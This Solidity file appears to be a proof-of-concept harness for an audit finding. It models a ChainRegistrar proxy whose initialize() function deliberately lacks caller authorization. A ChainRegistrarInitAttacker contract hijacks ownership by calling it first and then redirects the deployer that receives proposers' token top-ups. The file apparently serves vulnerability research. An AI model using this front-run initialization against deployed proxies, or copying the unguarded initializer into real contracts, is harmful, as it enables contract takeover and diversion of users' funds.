// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IChainRegistrarLike {
    function initialize(address _bridgehub, address _l2Deployer, address _owner) external;
    function owner() external view returns (address);
    function l2Deployer() external view returns (address);
    function changeDeployer(address _newDeployer) external;
    function proposeChainRegistration(
        uint256 _chainId,
        address _baseTokenAddress,
        uint128 _gasPriceMultiplierNominator,
        uint128 _gasPriceMultiplierDenominator
    ) external;
}

/// @notice Minimal proxy with unstructured storage to avoid implementation slot collisions.
contract EraContractsF1SimpleProxy {
    bytes32 private constant IMPLEMENTATION_SLOT =
        bytes32(uint256(keccak256("era.contracts.f1.proxy.implementation")) - 1);
    bytes32 private constant ADMIN_SLOT = bytes32(uint256(keccak256("era.contracts.f1.proxy.admin")) - 1);

    error Unauthorized();
    error ImplementationNotSet();

    constructor(address admin_) {
        bytes32 adminSlot = ADMIN_SLOT;
        assembly {
            sstore(adminSlot, admin_)
        }
    }

    function admin() public view returns (address admin_) {
        bytes32 adminSlot = ADMIN_SLOT;
        assembly {
            admin_ := sload(adminSlot)
        }
    }

    function implementation() public view returns (address implementation_) {
        bytes32 implementationSlot = IMPLEMENTATION_SLOT;
        assembly {
            implementation_ := sload(implementationSlot)
        }
    }

    function upgradeTo(address implementation_) external {
        if (msg.sender != admin()) revert Unauthorized();
        bytes32 implementationSlot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(implementationSlot, implementation_)
        }
    }

    fallback() external payable {
        _delegate();
    }

    receive() external payable {}

    function _delegate() internal {
        address impl = implementation();
        if (impl == address(0)) revert ImplementationNotSet();
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/// @notice Minimal ERC20 to model proposer top-up flow in ChainRegistrar.
contract MockERC20 {
    string public constant name = "MockToken";
    string public constant symbol = "MOCK";
    uint8 public constant decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "insufficient allowance");
        require(balanceOf[from] >= amount, "insufficient balance");

        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }

        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @notice ChainRegistrar model preserving bug parity:
///         `initialize(...)` is external-first-caller with no caller authorization guard.
///         `changeDeployer(...)` is owner-gated and influences proposer ERC20 top-ups.
contract ChainRegistrarLike {
    address internal constant ETH_TOKEN_ADDRESS = address(1);

    bool internal initialized;
    address internal _owner;
    address public l2Deployer;
    address public bridgehub;

    mapping(address author => mapping(uint256 chainId => bool proposed)) public proposed;

    error AlreadyInitialized();
    error Unauthorized();
    error ChainIsAlreadyProposed();

    constructor() {
        // Bug parity with implementation constructor calling `_disableInitializers`.
        initialized = true;
    }

    function owner() external view returns (address) {
        return _owner;
    }

    function initialize(address _bridgehub, address _l2Deployer, address _ownerAddress) external {
        if (initialized) revert AlreadyInitialized();
        initialized = true;
        bridgehub = _bridgehub;
        l2Deployer = _l2Deployer;
        _owner = _ownerAddress;
    }

    modifier onlyOwner() {
        if (msg.sender != _owner) revert Unauthorized();
        _;
    }

    function changeDeployer(address _newDeployer) external onlyOwner {
        l2Deployer = _newDeployer;
    }

    function proposeChainRegistration(
        uint256 _chainId,
        address _baseTokenAddress,
        uint128 _gasPriceMultiplierNominator,
        uint128 _gasPriceMultiplierDenominator
    ) external {
        if (proposed[msg.sender][_chainId]) revert ChainIsAlreadyProposed();
        proposed[msg.sender][_chainId] = true;

        if (_baseTokenAddress != ETH_TOKEN_ADDRESS) {
            uint256 amount = (1 ether * uint256(_gasPriceMultiplierNominator)) / uint256(_gasPriceMultiplierDenominator);
            if (IERC20Like(_baseTokenAddress).balanceOf(l2Deployer) < amount) {
                bool ok = IERC20Like(_baseTokenAddress).transferFrom(msg.sender, l2Deployer, amount);
                require(ok, "transferFrom failed");
            }
        }
    }
}

/// @notice Helper that performs attacker first-call initialization and owner-only deployer change.
contract ChainRegistrarInitAttacker {
    function hijack(address proxy, address bridgehub, address seededL2Deployer, address attackerOwner) external {
        IChainRegistrarLike(proxy).initialize(bridgehub, seededL2Deployer, attackerOwner);
    }

    function changeDeployer(address proxy, address newDeployer) external {
        IChainRegistrarLike(proxy).changeDeployer(newDeployer);
    }
}
